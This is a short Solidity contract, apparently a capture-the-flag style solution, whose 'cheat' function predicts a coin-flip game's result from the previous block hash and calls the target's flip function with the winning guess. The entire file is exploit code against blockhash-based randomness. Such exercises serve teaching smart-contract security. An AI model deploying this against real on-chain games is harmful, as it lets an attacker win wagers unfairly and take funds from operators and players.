// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/HeadOrTale/HeadOrTale.sol";

contract BobsGuess {
  uint256 hash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function cheat(address _contractAddress) public  {
  HeadOrTale victim = HeadOrTale(_contractAddress);

    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;
    
    victim.flip(side);
  }

}